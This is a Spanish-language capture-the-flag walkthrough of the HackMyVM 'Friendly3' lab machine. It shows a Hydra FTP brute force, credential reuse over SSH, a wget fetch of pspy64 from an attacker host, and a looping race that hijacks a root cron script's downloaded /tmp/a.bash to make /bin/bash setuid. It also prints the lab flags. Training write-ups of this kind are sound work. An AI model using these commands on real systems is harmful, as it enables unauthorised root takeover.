---
icon: flag
---

# Friendly3  HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-12 14:32 EDT
Nmap scan report for 192.168.5.15
Host is up (0.0023s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 bc:46:3d:85:18:bf:c7:bb:14:26:9a:20:6c:d3:39:52 (ECDSA)
|_  256 7b:13:5a:46:a5:62:33:09:24:9d:3e:67:b6:eb:3f:a1 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.22.1
MAC Address: 08:00:27:C0:AC:2B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.15 seconds
```

Veremos que hay un servidor `FTP` y un puerto `80` que alojara una pagina web, si nos metemos en la pagina web, veremos simplemente lo siguiente:

```
Hi, sysadmin  
I want you to know that I've just uploaded the new files into the FTP Server.  
See you,  
juan.
```

Veremos lo que puede ser un usuario, pero antes vamos a probar a mternos de forma anonima por el servidor `FTP`.

```shell
ftp anonymous@<IP>
```

Veremos que no podemos, por lo que vamos a probar a realizar `fuerza bruta` con el usuario `juan` a ver si hay suerte.

## Hydra (FTP)

```shell
hydra -l juan -P <WORDLIST> ftp://<IP>/ -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-12 14:37:16
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ftp://192.168.5.15:21/
[21][ftp] host: 192.168.5.15   login: juan   password: alexis
^C
```

Veremos que hemos encontrado las credenciales del `FTP` de dicho usuario, por lo que vamos a conectarnos por `FTP` con dichas credenciales.

```shell
ftp juan@<IP>
```

Metemos como contraseña `alexis` y veremos que estamos dentro, si listamos la carpeta veremos lo siguiente:

```
229 Entering Extended Passive Mode (|||34403|)
150 Here comes the directory listing.
drwxr-xr-x   14 0        0            4096 Jun 25  2023 .
drwxr-xr-x   14 0        0            4096 Jun 25  2023 ..
-rw-r--r--    1 0        0               0 Jun 25  2023 file1
-rw-r--r--    1 0        0               0 Jun 25  2023 file10
-rw-r--r--    1 0        0               0 Jun 25  2023 file100
-rw-r--r--    1 0        0               0 Jun 25  2023 file11
-rw-r--r--    1 0        0               0 Jun 25  2023 file12
-rw-r--r--    1 0        0               0 Jun 25  2023 file13
-rw-r--r--    1 0        0               0 Jun 25  2023 file14
-rw-r--r--    1 0        0               0 Jun 25  2023 file15
-rw-r--r--    1 0        0               0 Jun 25  2023 file16
-rw-r--r--    1 0        0               0 Jun 25  2023 file17
-rw-r--r--    1 0        0               0 Jun 25  2023 file18
-rw-r--r--    1 0        0               0 Jun 25  2023 file19
-rw-r--r--    1 0        0               0 Jun 25  2023 file2
-rw-r--r--    1 0        0               0 Jun 25  2023 file20
-rw-r--r--    1 0        0               0 Jun 25  2023 file21
-rw-r--r--    1 0        0               0 Jun 25  2023 file22
-rw-r--r--    1 0        0               0 Jun 25  2023 file23
-rw-r--r--    1 0        0               0 Jun 25  2023 file24
-rw-r--r--    1 0        0               0 Jun 25  2023 file25
-rw-r--r--    1 0        0               0 Jun 25  2023 file26
-rw-r--r--    1 0        0               0 Jun 25  2023 file27
-rw-r--r--    1 0        0               0 Jun 25  2023 file28
-rw-r--r--    1 0        0               0 Jun 25  2023 file29
-rw-r--r--    1 0        0               0 Jun 25  2023 file3
-rw-r--r--    1 0        0               0 Jun 25  2023 file30
-rw-r--r--    1 0        0               0 Jun 25  2023 file31
-rw-r--r--    1 0        0               0 Jun 25  2023 file32
-rw-r--r--    1 0        0               0 Jun 25  2023 file33
-rw-r--r--    1 0        0               0 Jun 25  2023 file34
-rw-r--r--    1 0        0               0 Jun 25  2023 file35
-rw-r--r--    1 0        0               0 Jun 25  2023 file36
-rw-r--r--    1 0        0               0 Jun 25  2023 file37
-rw-r--r--    1 0        0               0 Jun 25  2023 file38
-rw-r--r--    1 0        0               0 Jun 25  2023 file39
-rw-r--r--    1 0        0               0 Jun 25  2023 file4
-rw-r--r--    1 0        0               0 Jun 25  2023 file40
-rw-r--r--    1 0        0               0 Jun 25  2023 file41
-rw-r--r--    1 0        0               0 Jun 25  2023 file42
-rw-r--r--    1 0        0               0 Jun 25  2023 file43
-rw-r--r--    1 0        0               0 Jun 25  2023 file44
-rw-r--r--    1 0        0               0 Jun 25  2023 file45
-rw-r--r--    1 0        0               0 Jun 25  2023 file46
-rw-r--r--    1 0        0               0 Jun 25  2023 file47
-rw-r--r--    1 0        0               0 Jun 25  2023 file48
-rw-r--r--    1 0        0               0 Jun 25  2023 file49
-rw-r--r--    1 0        0               0 Jun 25  2023 file5
-rw-r--r--    1 0        0               0 Jun 25  2023 file50
-rw-r--r--    1 0        0               0 Jun 25  2023 file51
-rw-r--r--    1 0        0               0 Jun 25  2023 file52
-rw-r--r--    1 0        0               0 Jun 25  2023 file53
-rw-r--r--    1 0        0               0 Jun 25  2023 file54
-rw-r--r--    1 0        0               0 Jun 25  2023 file55
-rw-r--r--    1 0        0               0 Jun 25  2023 file56
-rw-r--r--    1 0        0               0 Jun 25  2023 file57
-rw-r--r--    1 0        0               0 Jun 25  2023 file58
-rw-r--r--    1 0        0               0 Jun 25  2023 file59
-rw-r--r--    1 0        0               0 Jun 25  2023 file6
-rw-r--r--    1 0        0               0 Jun 25  2023 file60
-rw-r--r--    1 0        0               0 Jun 25  2023 file61
-rw-r--r--    1 0        0               0 Jun 25  2023 file62
-rw-r--r--    1 0        0               0 Jun 25  2023 file63
-rw-r--r--    1 0        0               0 Jun 25  2023 file64
-rw-r--r--    1 0        0               0 Jun 25  2023 file65
-rw-r--r--    1 0        0               0 Jun 25  2023 file66
-rw-r--r--    1 0        0               0 Jun 25  2023 file67
-rw-r--r--    1 0        0               0 Jun 25  2023 file68
-rw-r--r--    1 0        0               0 Jun 25  2023 file69
-rw-r--r--    1 0        0               0 Jun 25  2023 file7
-rw-r--r--    1 0        0               0 Jun 25  2023 file70
-rw-r--r--    1 0        0               0 Jun 25  2023 file71
-rw-r--r--    1 0        0               0 Jun 25  2023 file72
-rw-r--r--    1 0        0               0 Jun 25  2023 file73
-rw-r--r--    1 0        0               0 Jun 25  2023 file74
-rw-r--r--    1 0        0               0 Jun 25  2023 file75
-rw-r--r--    1 0        0               0 Jun 25  2023 file76
-rw-r--r--    1 0        0               0 Jun 25  2023 file77
-rw-r--r--    1 0        0               0 Jun 25  2023 file78
-rw-r--r--    1 0        0               0 Jun 25  2023 file79
-rw-r--r--    1 0        0               0 Jun 25  2023 file8
-rw-r--r--    1 0        0              36 Jun 25  2023 file80
-rw-r--r--    1 0        0               0 Jun 25  2023 file81
-rw-r--r--    1 0        0               0 Jun 25  2023 file82
-rw-r--r--    1 0        0               0 Jun 25  2023 file83
-rw-r--r--    1 0        0               0 Jun 25  2023 file84
-rw-r--r--    1 0        0               0 Jun 25  2023 file85
-rw-r--r--    1 0        0               0 Jun 25  2023 file86
-rw-r--r--    1 0        0               0 Jun 25  2023 file87
-rw-r--r--    1 0        0               0 Jun 25  2023 file88
-rw-r--r--    1 0        0               0 Jun 25  2023 file89
-rw-r--r--    1 0        0               0 Jun 25  2023 file9
-rw-r--r--    1 0        0               0 Jun 25  2023 file90
-rw-r--r--    1 0        0               0 Jun 25  2023 file91
-rw-r--r--    1 0        0               0 Jun 25  2023 file92
-rw-r--r--    1 0        0               0 Jun 25  2023 file93
-rw-r--r--    1 0        0               0 Jun 25  2023 file94
-rw-r--r--    1 0        0               0 Jun 25  2023 file95
-rw-r--r--    1 0        0               0 Jun 25  2023 file96
-rw-r--r--    1 0        0               0 Jun 25  2023 file97
-rw-r--r--    1 0        0               0 Jun 25  2023 file98
-rw-r--r--    1 0        0               0 Jun 25  2023 file99
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold10
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold11
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold12
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold13
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold14
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold15
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold4
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold5
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold6
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold7
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold8
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold9
-rw-r--r--    1 0        0              58 Jun 25  2023 fole32
226 Directory send OK.
```

Vemos muchisimos archivos, algunos tienen contenido, otros no, pero tampoco es muy importante la informacion que contiene, por lo que vamos a probar las misma credenciales pero por el servidor `SSH`.

## Escalate user juan

```shell
ssh juan@<IP>
```

Metemos como contraseña `alexis` y veremos que si funciona, estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
cb40b159c8086733d57280de3f97de30
```

## Escalate Privileges

Si vamos a la carpeta `/opt` veremos lo siguiente:

```
total 12
drwxr-xr-x  2 root root 4096 Jun 25  2023 .
drwxr-xr-x 18 root root 4096 Jun 25  2023 ..
-rwxr-xr-x  1 root root  190 Jun 25  2023 check_for_install.sh
```

Vemos que hay un script bastante interesante, vamos a ver que hace por dentro.

```bash
#!/bin/bash


/usr/bin/curl "http://127.0.0.1/9842734723948024.bash" > /tmp/a.bash

chmod +x /tmp/a.bash
chmod +r /tmp/a.bash
chmod +w /tmp/a.bash

/bin/bash /tmp/a.bash

rm -rf /tmp/a.bash
```

Vemos que es un script que ejecuta varias cosas, entre ellas esta:

```bash
/bin/bash /tmp/a.bash
```

Si listamos la `/tmp` veremos que no esta el archivo, por lo que tiene que haber algo por dentro como un `crontab` que puede estar ejecutando dicho script, vamos a ver los procesos que estan pasando en el sistema con `pspy64`.

Nos descargaremos el script de `GitHub`.

URL = [Download pspy64](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64)

> Host

```shell
python3 -m http.server 80
```

> Maquina victima

```shell
wget http://<IP_ATTACKER>/pspy64
cd /tmp
./pspy64
```

Info:

```
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/05/12 14:51:40 CMD: UID=1001  PID=859    | ./pspy64 
2025/05/12 14:51:40 CMD: UID=0     PID=821    | 
2025/05/12 14:51:40 CMD: UID=1001  PID=748    | -bash 
2025/05/12 14:51:40 CMD: UID=1001  PID=747    | sshd: juan@pts/0     
2025/05/12 14:51:40 CMD: UID=1001  PID=737    | (sd-pam) 
2025/05/12 14:51:40 CMD: UID=0     PID=736    | 
2025/05/12 14:51:40 CMD: UID=1001  PID=735    | /lib/systemd/systemd --user 
2025/05/12 14:51:40 CMD: UID=0     PID=733    | 
2025/05/12 14:51:40 CMD: UID=0     PID=731    | 
2025/05/12 14:51:40 CMD: UID=0     PID=729    | sshd: juan [priv]    
2025/05/12 14:51:40 CMD: UID=33    PID=405    | nginx: worker process                            
2025/05/12 14:51:40 CMD: UID=0     PID=402    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2025/05/12 14:51:40 CMD: UID=0     PID=401    | nginx: master process /usr/sbin/nginx -g daemon on; master_process on; 
2025/05/12 14:51:40 CMD: UID=0     PID=379    | /sbin/agetty -o -p -- \u --noclear - linux 
2025/05/12 14:51:40 CMD: UID=0     PID=376    | /usr/sbin/vsftpd /etc/vsftpd.conf 
2025/05/12 14:51:40 CMD: UID=0     PID=351    | dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3                                                                                                                               
2025/05/12 14:51:40 CMD: UID=0     PID=348    | 
2025/05/12 14:51:40 CMD: UID=0     PID=346    | 
2025/05/12 14:51:40 CMD: UID=0     PID=343    | 
2025/05/12 14:51:40 CMD: UID=0     PID=341    | 
2025/05/12 14:51:40 CMD: UID=0     PID=336    | 
2025/05/12 14:51:40 CMD: UID=0     PID=332    | 
2025/05/12 14:51:40 CMD: UID=0     PID=330    | 
2025/05/12 14:51:40 CMD: UID=0     PID=328    | 
2025/05/12 14:51:40 CMD: UID=0     PID=310    | 
2025/05/12 14:51:40 CMD: UID=0     PID=292    | /lib/systemd/systemd-logind 
2025/05/12 14:51:40 CMD: UID=101   PID=288    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2025/05/12 14:51:40 CMD: UID=0     PID=287    | /usr/sbin/cron -f 
2025/05/12 14:51:40 CMD: UID=0     PID=285    | 
2025/05/12 14:51:40 CMD: UID=0     PID=237    | /lib/systemd/systemd-udevd 
2025/05/12 14:51:40 CMD: UID=0     PID=206    | /lib/systemd/systemd-journald 
2025/05/12 14:51:40 CMD: UID=0     PID=168    | 
2025/05/12 14:51:40 CMD: UID=0     PID=167    | 
2025/05/12 14:51:40 CMD: UID=0     PID=135    | 
2025/05/12 14:51:40 CMD: UID=0     PID=127    | 
2025/05/12 14:51:40 CMD: UID=0     PID=126    | 
2025/05/12 14:51:40 CMD: UID=0     PID=125    | 
2025/05/12 14:51:40 CMD: UID=0     PID=124    | 
2025/05/12 14:51:40 CMD: UID=0     PID=123    | 
2025/05/12 14:51:40 CMD: UID=0     PID=122    | 
2025/05/12 14:51:40 CMD: UID=0     PID=121    | 
2025/05/12 14:51:40 CMD: UID=0     PID=60     | 
2025/05/12 14:51:40 CMD: UID=0     PID=59     | 
2025/05/12 14:51:40 CMD: UID=0     PID=54     | 
2025/05/12 14:51:40 CMD: UID=0     PID=49     | 
2025/05/12 14:51:40 CMD: UID=0     PID=48     | 
2025/05/12 14:51:40 CMD: UID=0     PID=47     | 
2025/05/12 14:51:40 CMD: UID=0     PID=46     | 
2025/05/12 14:51:40 CMD: UID=0     PID=44     | 
2025/05/12 14:51:40 CMD: UID=0     PID=38     | 
2025/05/12 14:51:40 CMD: UID=0     PID=37     | 
2025/05/12 14:51:40 CMD: UID=0     PID=36     | 
2025/05/12 14:51:40 CMD: UID=0     PID=35     | 
2025/05/12 14:51:40 CMD: UID=0     PID=34     | 
2025/05/12 14:51:40 CMD: UID=0     PID=33     | 
2025/05/12 14:51:40 CMD: UID=0     PID=32     | 
2025/05/12 14:51:40 CMD: UID=0     PID=31     | 
2025/05/12 14:51:40 CMD: UID=0     PID=30     | 
2025/05/12 14:51:40 CMD: UID=0     PID=29     | 
2025/05/12 14:51:40 CMD: UID=0     PID=28     | 
2025/05/12 14:51:40 CMD: UID=0     PID=27     | 
2025/05/12 14:51:40 CMD: UID=0     PID=25     | 
2025/05/12 14:51:40 CMD: UID=0     PID=24     | 
2025/05/12 14:51:40 CMD: UID=0     PID=23     | 
2025/05/12 14:51:40 CMD: UID=0     PID=22     | 
2025/05/12 14:51:40 CMD: UID=0     PID=21     | 
2025/05/12 14:51:40 CMD: UID=0     PID=20     | 
2025/05/12 14:51:40 CMD: UID=0     PID=18     | 
2025/05/12 14:51:40 CMD: UID=0     PID=16     | 
2025/05/12 14:51:40 CMD: UID=0     PID=15     | 
2025/05/12 14:51:40 CMD: UID=0     PID=14     | 
2025/05/12 14:51:40 CMD: UID=0     PID=13     | 
2025/05/12 14:51:40 CMD: UID=0     PID=12     | 
2025/05/12 14:51:40 CMD: UID=0     PID=11     | 
2025/05/12 14:51:40 CMD: UID=0     PID=10     | 
2025/05/12 14:51:40 CMD: UID=0     PID=9      | 
2025/05/12 14:51:40 CMD: UID=0     PID=6      | 
2025/05/12 14:51:40 CMD: UID=0     PID=5      | 
2025/05/12 14:51:40 CMD: UID=0     PID=4      | 
2025/05/12 14:51:40 CMD: UID=0     PID=3      | 
2025/05/12 14:51:40 CMD: UID=0     PID=2      | 
2025/05/12 14:51:40 CMD: UID=0     PID=1      | /sbin/init
2025/05/12 14:52:01 CMD: UID=0     PID=866    | /usr/sbin/CRON -f 
2025/05/12 14:52:01 CMD: UID=0     PID=867    | /usr/sbin/CRON -f 
2025/05/12 14:52:02 CMD: UID=0     PID=868    | /bin/sh -c /opt/check_for_install.sh 
2025/05/12 14:52:02 CMD: UID=0     PID=869    | /bin/bash /opt/check_for_install.sh 
2025/05/12 14:52:02 CMD: UID=0     PID=870    | /bin/bash /opt/check_for_install.sh 
2025/05/12 14:52:02 CMD: UID=0     PID=871    | /bin/bash /opt/check_for_install.sh 
2025/05/12 14:52:02 CMD: UID=0     PID=872    | /bin/bash /opt/check_for_install.sh 
2025/05/12 14:52:02 CMD: UID=0     PID=873    | /bin/bash /opt/check_for_install.sh 
2025/05/12 14:52:02 CMD: UID=0     PID=874    | /bin/bash /opt/check_for_install.sh
2025/05/12 14:53:01 CMD: UID=0     PID=876    | /usr/sbin/CRON -f 
2025/05/12 14:53:01 CMD: UID=0     PID=875    | /usr/sbin/CRON -f 
2025/05/12 14:53:01 CMD: UID=0     PID=877    | /bin/sh -c /opt/check_for_install.sh 
2025/05/12 14:53:01 CMD: UID=0     PID=878    | /bin/bash /opt/check_for_install.sh 
2025/05/12 14:53:01 CMD: UID=0     PID=879    | /bin/bash /opt/check_for_install.sh 
2025/05/12 14:53:01 CMD: UID=0     PID=880    | /bin/bash /opt/check_for_install.sh 
2025/05/12 14:53:01 CMD: UID=0     PID=881    | chmod +w /tmp/a.bash 
2025/05/12 14:53:01 CMD: UID=0     PID=882    | /bin/bash /opt/check_for_install.sh 
2025/05/12 14:53:01 CMD: UID=0     PID=883    | /bin/bash /opt/check_for_install.sh 
2025/05/12 14:53:16 CMD: UID=0     PID=885    | 
2025/05/12 14:54:01 CMD: UID=0     PID=886    | /usr/sbin/CRON -f 
2025/05/12 14:54:01 CMD: UID=0     PID=887    | /usr/sbin/CRON -f 
2025/05/12 14:54:01 CMD: UID=0     PID=888    | /bin/sh -c /opt/check_for_install.sh 
2025/05/12 14:54:01 CMD: UID=0     PID=889    | /bin/bash /opt/check_for_install.sh 
2025/05/12 14:54:01 CMD: UID=0     PID=890    | chmod +x /tmp/a.bash 
2025/05/12 14:54:01 CMD: UID=0     PID=891    | /bin/bash /opt/check_for_install.sh 
2025/05/12 14:54:01 CMD: UID=0     PID=892    | /bin/bash /opt/check_for_install.sh 
2025/05/12 14:54:01 CMD: UID=0     PID=893    | /bin/bash /opt/check_for_install.sh 
2025/05/12 14:54:01 CMD: UID=0     PID=894    | rm -rf /tmp/a.bash 
2025/05/12 14:54:32 CMD: UID=0     PID=895    | 
^CExiting program... (interrupt)
```

Vemos que efectivamente se esta ejecutando un `crontab` del `.sh` por lo que vemos en el script primero se descarga el `a.bash` y despues lo ejecuta, despues lo elimina, pero vamos a realizar un bucle en el que se este creando de forma infinita el `a.bash` con el `paylod` y esperemos a que se ejecute dicho script por `root` ya que vemos que lo esta ejecutando `root`.

```shell
cd ~/
```

> a.bash

```shell
#!/bin/bash

chmod u+s /bin/bash
```

Lo guardamos y ejecutaremos lo siguiente:

> while.sh

```shell
#!/bin/bash

# Ruta origen y destino
ORIGEN="/home/juan/a.bash"
DESTINO="/tmp/a.bash"

# Bucle infinito que copia
while true; do
    cp "$ORIGEN" "$DESTINO"
    chmod +x /tmp/a.bash
    echo "Copiado a las $(date)"
done
```

Ahora establecemos permisos de ejecuccion:

```shell
chmod +x while.sh
```

Vamos a ejecutarlo y esperar un poco.

```shell
./while.sh
```

Despues de un rato, vamos a probar a listar la `bash`.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
```

Veremos que ha funcionado, por lo que haremos lo siguiente:

```shell
bash -p
```

Info:

```
bash-5.2# whoami
root
```

Veremos que somos `root`, por lo que leeremos la `flag` del usuario `root`.

> root.txt

```
eb9748b67f25e6bd202e5fa25f534d51
```
